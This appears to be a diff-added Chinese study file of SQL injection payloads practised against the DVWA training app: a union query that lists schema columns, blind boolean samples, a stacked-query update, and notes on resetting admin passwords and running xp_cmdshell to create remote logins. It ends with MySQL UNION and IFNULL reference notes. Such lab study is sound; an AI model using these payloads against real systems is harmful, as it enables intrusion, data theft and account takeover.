+select first_name,last_name from dvwa.users where user_id ='1' and 1=2 union all SELECT column_name,null FROM information_schema.columns where table_schema='dvwa' and table_name='users'  #
+===================================================================================
+Oracle===================================================================================
+
+
+
+===================================================================================
+SQL Server===================================================================================
+
+
+
+
+===================================================================================
+PostgreSQL===================================================================================
+
+
+===================================================================================
+SQLite===================================================================================
+
+
+===================================================================================
+Microsoft Access===================================================================================
+
+
+===================================================================================
+FireBird===================================================================================
+
+
+
+===================================================================================
+SAP MaxDB===================================================================================
+
+
+===================================================================================
+Sybase===================================================================================
+
+
+
+===================================================================================
+IBM DB2===================================================================================
+
+
+===================================================================================
+HSQLLDB===================================================================================
+
+
+
+
+===================================================================================
+===================================================================================
+
+5、堆查询注入（Stacked queries SQL injection），可以同时执行多条语句的执行时的注入。
+比如用;分隔后执行其他sql语句，一般用于更新数据或执行系统相关命令，比如在参数后面增加; update sysuser set password='' where username='admin'，或比如sqlserver执行exec master..xp_cmdshell，执行cmd命令创建远程登录用户等。
+sqlmap非常强大，可以get,post,httpheader的值变化识别是否存在注入，它可以自动识别MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB数据库，还有一些常用的绕过防止sql注入的替换符号，也可以自己扩展python脚本绕过WAF之类的防注入程序，常用参数和常用检测命令后续单独再写一个blog文章。
+===================================================================================
+sample1:
+select first_name,last_name from users where user_id ='1' and exists(select count(*) from(select database()) as t where substring(database(),1,4)='dvwb')
+sample2:
+select first_name,last_name from users where user_id ='1' and substring(database(),1,4)='dvwa'
+===================================================================================
+MySQL===================================================================================
+SELECT first_name,last_name FROM users where user_id='1';update users set user='1337' WHERE USER_ID=3;select first_name,last_name from users where user_id='1'  #
+
+
+===================================================================================
+Oracle===================================================================================
+
+
+
+===================================================================================
+SQL Server===================================================================================
+
+
+
+
+===================================================================================
+PostgreSQL===================================================================================
+
+
+===================================================================================
+SQLite===================================================================================
+
+
+===================================================================================
+Microsoft Access===================================================================================
+
+
+===================================================================================
+FireBird===================================================================================
+
+
+
+===================================================================================
+SAP MaxDB===================================================================================
+
+
+===================================================================================
+Sybase===================================================================================
+
+
+
+===================================================================================
+IBM DB2===================================================================================
+
+
+===================================================================================
+HSQLLDB===================================================================================
+
+
+
+
+===================================================================================
+===================================================================================
+
+
+
+
+union 和union all 的区别：
+一：对于重复结果的处理
+    union all 会重复输出两个结果集中的重复记录，union不会。
+二：对于排序的处理
+    union all将会按照关联的次序组织数据，union将会按照字段的顺序排列。
+    order by 可以人为的控制结果集的排序，但是要注意，orderby必须写在最后一个结果集里，对于union，union all，intersect，minus都有效。
+
+
+注意：union可以对字段名不同但数据类型相同的结果集进行合并；
+      如果对字段名不同但数据类型相同的结果集进行合并，那么对此字段的orderby语句将失效。
+
+
+Mysql的if既可以作为表达式用，也可在存储过程中作为流程控制语句使用，如下是做为表达式使用：
+
+IF表达式
+IF(expr1,expr2,expr3)
+如果 expr1 是TRUE (expr1 <> 0 and expr1 <> NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。
+select *,if(sva=1,"男","女") as ssva from taname where sva != ""
+
+IFNULL(expr1,expr2)
+
+假如expr1 不为 NULL，则 IFNULL() 的返回值为 expr1; 否则其返回值为 expr2。IFNULL()的返回值是数字或是字符串，具体情况取决于其所使用的语境。
+mysql> SELECT IFNULL(1,0);
+        -> 1
+mysql> SELECT IFNULL(NULL,10);
+        -> 10
+mysql> SELECT IFNULL(1/0,10);
+        -> 10
+mysql> SELECT IFNULL(1/0,'yes');
+        -> 'yes'
+IFNULL(expr1,expr2) 的默认结果值为两个表达式中更加“通用”的一个，顺序为STRING、 REAL或 INTEGER。
+
+
